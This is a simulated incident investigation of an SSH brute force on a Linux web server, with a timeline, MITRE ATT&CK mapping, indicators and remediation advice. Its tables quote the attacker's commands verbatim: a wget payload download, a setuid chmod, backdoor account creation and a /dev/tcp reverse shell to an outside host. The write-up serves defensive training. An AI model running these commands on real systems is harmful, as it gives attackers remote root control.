# Investigation: SSH Brute Force to Root Backdoor

**Type:** Incident investigation (simulated)  
**Evidence:** [`sample_auth.log`](https://github.com/SaihanLob/Log-Analyser/blob/main/samples/sample_auth.log), one day of `/var/log/auth.log` from a Linux web server (`web01`)  
**Tools:** [Log Analyser](https://github.com/SaihanLob/Log-Analyser), manual log review  
**Frameworks:** NIST SP 800-61 incident response lifecycle, MITRE ATT&CK  

> This log was written to simulate a realistic intrusion, for practising investigation and for testing Log Analyser. No real systems were involved. All IP addresses are from ranges reserved for documentation (RFC 5737).


## Executive Summary

On 1 November, an external host at `203.0.113.45` gained access to `web01` over SSH by guessing the password of the `deploy` account, after first trying four common account names that do not exist on the server. The attack took 39 seconds from first attempt to successful login.

Within four minutes of logging in, the attacker used `deploy`'s sudo rights to download a script from a second external host (`198.51.100.23`), made it a setuid root binary, created a new account named `sysupdate`, added that account to the `sudo` group, and opened a reverse shell to `198.51.100.23` on port 4444. The attacker logged out at 07:22.

The server should be treated as fully compromised. The attacker had root-level access, and at least three persistence mechanisms were established: the `sysupdate` account, the setuid binary at `/tmp/.u.sh`, and the reverse shell. A separate, slow password-guessing attempt against `root` from `198.51.100.77` earlier the same day did not succeed and appears unrelated.


## Scope and Limitations

The investigation is based solely on the authentication log. This log records logins, `sudo` and `su` use, account changes and cron jobs. It does not record network connections, file contents or commands run inside an interactive shell. The following therefore cannot be confirmed from this evidence alone:

- whether the reverse shell connected successfully, or what was done through it;
- the contents of `/tmp/.u.sh`;
- whether data was taken from the server;
- whether the attacker established persistence beyond what was recorded, such as SSH keys, cron jobs or systemd services added through the reverse shell.

These questions are addressed in the recommendations. Timestamps are as recorded by the server. The log does not state a time zone.


## Methodology

The log was first analysed with Log Analyser to produce a prioritised list of findings:

```bash
python analyser.py --syslog samples/sample_auth.log
```

The tool produced 34 findings, 8 of them High:

| Time | Category | Finding |
|------|----------|---------|
| 07:15:00 | Brute Force | 11 failed logins from 203.0.113.45 within 60s (users tried: admin, deploy, oracle, test, ubuntu) |
| 07:15:39 | Possible Compromise | Successful login for `deploy` from 203.0.113.45 after a brute force from the same IP |
| 07:16:42 | Privilege Escalation | `FAILED SU (to root) deploy on pts/1` |
| 07:17:15 | Suspicious Process | Download from a bare IP address: `wget http://198.51.100.23/update.sh -O /tmp/.u.sh` |
| 07:17:31 | Privilege Escalation | Setuid/setgid bit set: `chmod 4755 /tmp/.u.sh` |
| 07:18:20 | Account Created | New user account created: `sysupdate` |
| 07:18:41 | Privilege Escalation | User added to an admin group: `usermod -aG sudo sysupdate` |
| 07:19:10 | Suspicious Process | Reverse shell: `bash -c bash -i >& /dev/tcp/198.51.100.23/4444 0>&1` |

The full log was then reviewed manually to build a complete timeline, to establish what normal activity on the server looks like, and to identify anything the tool did not flag. The manual review found that the `deploy` session began at 07:15:39 and ended at 07:22:55, and that all of the attacker's activity falls inside it. It also found that the `sudo id` command at 07:16:02 was the attacker's first action after logging in. The tool records this at Low severity because `id` is harmless on its own.

To check for slower attacks, the tool was run again with a longer window:

```bash
python analyser.py --syslog samples/sample_auth.log --threshold 3 --window 7200
```

This additionally flagged `198.51.100.77`, which tried the `root` account six times between 03:05 and 06:33, roughly every 40 minutes. This pacing is typical of attackers trying to stay below rate-based alerting thresholds.


## Baseline: Normal Activity

Establishing what normal looks like makes the malicious activity easier to separate. The following activity was assessed as legitimate:

- **02:00** and **08:00**: root's scheduled backup and system statistics cron jobs.
- **02:14**: `alice` mistyped her password once from `192.0.2.88`, then logged in successfully. A single failure followed by success from a known address is ordinary user behaviour.
- **03:00**: a cron job run by the user `john`.
- **09:02 to 09:03**: `alice` logged in with an SSH key and restarted nginx with sudo, which is routine administration.


## Timeline of the Intrusion

| Time | Source | Event | Assessment |
|------|--------|-------|------------|
| 07:15:00 to 07:15:09 | 203.0.113.45 | Failed logins for `admin`, `test`, `oracle` and `ubuntu` | Password spraying against common default account names, none of which exist on the server |
| 07:15:14 to 07:15:35 | 203.0.113.45 | Seven failed logins for `deploy` | Password guessing against a real account, possibly identified from a username list or earlier reconnaissance |
| 07:15:39 | 203.0.113.45 | **Accepted password for `deploy`** | **Initial access.** The attacker now holds valid credentials |
| 07:16:02 | deploy | `sudo /usr/bin/id` | Discovery: checking privileges. Success confirms that `deploy` can use sudo |
| 07:16:40 to 07:16:42 | deploy | `su` to root fails | The attacker tried root's password and failed, then used sudo instead |
| 07:17:15 | deploy (sudo) | `wget http://198.51.100.23/update.sh -O /tmp/.u.sh` | Tool transfer from attacker infrastructure, saved under a hidden file name in `/tmp` |
| 07:17:31 | deploy (sudo) | `chmod 4755 /tmp/.u.sh` | Setuid root: the file now runs as root for any user, a persistent route back to root |
| 07:18:04 to 07:18:20 | deploy (sudo) | `useradd -m -s /bin/bash sysupdate`, account created with UID 1003 | Persistence: a new account with a name chosen to look like a system account |
| 07:18:41 | deploy (sudo) | `usermod -aG sudo sysupdate` | The backdoor account is given full sudo rights |
| 07:19:10 | deploy (sudo) | `bash -c bash -i >& /dev/tcp/198.51.100.23/4444 0>&1` | Command and control: a root shell sent to the attacker's server on port 4444 |
| 07:22:55 | 203.0.113.45 | `deploy` session closed | The attacker leaves the SSH session. The reverse shell may still be active |


## MITRE ATT&CK Mapping

| Tactic | Technique | Evidence |
|--------|-----------|----------|
| Credential Access | T1110.003 Brute Force: Password Spraying | One attempt each against admin, test, oracle and ubuntu |
| Credential Access | T1110.001 Brute Force: Password Guessing | Seven attempts against deploy in 21 seconds |
| Initial Access | T1078.003 Valid Accounts: Local Accounts | Successful login as deploy with the guessed password |
| Lateral Movement | T1021.004 Remote Services: SSH | Access was over SSH |
| Discovery | T1033 System Owner/User Discovery | `sudo id` |
| Privilege Escalation | T1548.003 Abuse Elevation Control Mechanism: Sudo and Sudo Caching | All root actions were run through deploy's sudo rights |
| Command and Control | T1105 Ingress Tool Transfer | `wget` of `update.sh` from 198.51.100.23 |
| Defence Evasion | T1564.001 Hide Artifacts: Hidden Files and Directories | Payload saved as the hidden file `/tmp/.u.sh` |
| Persistence, Privilege Escalation | T1548.001 Abuse Elevation Control Mechanism: Setuid and Setgid | `chmod 4755 /tmp/.u.sh` |
| Persistence | T1136.001 Create Account: Local Account | `sysupdate` created |
| Persistence | T1098 Account Manipulation | `sysupdate` added to the sudo group |
| Execution | T1059.004 Command and Scripting Interpreter: Unix Shell | Interactive bash used for the reverse shell |
| Command and Control | T1571 Non-Standard Port | Reverse shell over TCP 4444 |


## Indicators of Compromise

| Type | Indicator | Context |
|------|-----------|---------|
| IP address | `203.0.113.45` | Source of the brute force and of the malicious `deploy` login |
| IP address | `198.51.100.23` | Hosted `update.sh` and received the reverse shell |
| URL | `http://198.51.100.23/update.sh` | Payload download |
| Network | `198.51.100.23:4444/tcp` | Reverse shell destination |
| File | `/tmp/.u.sh` | Downloaded payload, setuid root |
| Account | `sysupdate` (UID 1003, member of sudo) | Backdoor account |
| Account | `deploy` | Compromised account. Its password is known to the attacker |
| IP address | `198.51.100.77` | Unsuccessful slow password guessing against root. Not linked to the intrusion |


## Impact Assessment

The attacker obtained root-level control of `web01`. Any data on the server, including application secrets, database credentials and SSH keys stored on it, should be assumed to be exposed. Because the server is a web server, it may hold credentials that allow access to other systems. The attacker's working reverse shell and backdoor account would allow them to return at will.


## Recommendations

The recommendations follow the containment, eradication and recovery phases of the NIST incident response lifecycle.

### Containment

Isolate `web01` from the network, keeping it powered on so that memory and running processes can be examined. Block `203.0.113.45` and `198.51.100.23` at the perimeter firewall, and search firewall, proxy and DNS logs from other systems for any contact with them. Check whether the reverse shell is still connected by looking for established connections to `198.51.100.23:4444`.

### Eradication

Because the attacker held root, the safest course is to rebuild the server from a known good image rather than attempt to clean it. If the server must be cleaned, at minimum:

- disable `deploy` and `sysupdate`, remove both from the `sudo` group, and delete `sysupdate`;
- preserve a copy of `/tmp/.u.sh` for analysis, then remove it, and search for other setuid files with `find / -perm -4000 -type f`;
- check every account's `~/.ssh/authorized_keys`, the crontabs, `/etc/cron.*`, systemd units and `/etc/sudoers.d/` for further persistence.

### Recovery

Reset the passwords of every account on the server and rotate any secrets stored on it, including database passwords, API keys and SSH keys. Monitor the rebuilt server closely for renewed contact from the indicators above.

### Preventing a Recurrence

The intrusion succeeded because a sudo-capable account accepted password logins from the internet with a guessable password. The following changes would have prevented it:

- **Disable SSH password authentication** (`PasswordAuthentication no`) and require keys, as `alice` already uses. This alone would have stopped the attack.
- **Disable direct root login** (`PermitRootLogin no`), which the slow attack from `198.51.100.77` was targeting.
- **Rate-limit SSH** with a tool such as fail2ban, and restrict SSH to known addresses or a VPN where possible.
- **Restrict `deploy`'s sudo rights** to the specific commands deployments need, rather than full root.
- **Alert in real time** on a successful login following a brute force, new accounts, sudo group changes and setuid changes. All of these appear in the authentication log. Here they were found only after the fact.


## Key Takeaways

- **Correlation is what turns noise into an incident.** Failed SSH logins are constant on any internet-facing server and are rarely worth investigating individually. A brute force followed by a successful login from the same address is a confirmed compromise. Grouping by source IP rather than username was necessary to see this attack as a whole, because the spraying phase made only one attempt per username.
- **Knowing what normal looks like makes the abnormal obvious.** Separating `alice`'s single mistyped password and routine sudo use from the attacker's activity was straightforward once the server's normal pattern was established.
- **Severity has to follow what a command does, not how it was run.** All of the attacker's actions were ordinary sudo log entries. Treating every sudo command the same way would have buried the reverse shell alongside a routine nginx restart.
- **One log source has limits.** The authentication log showed how the attacker got in and what they set up, but not what they did afterwards. A real investigation would need network and endpoint data to establish the full scope.
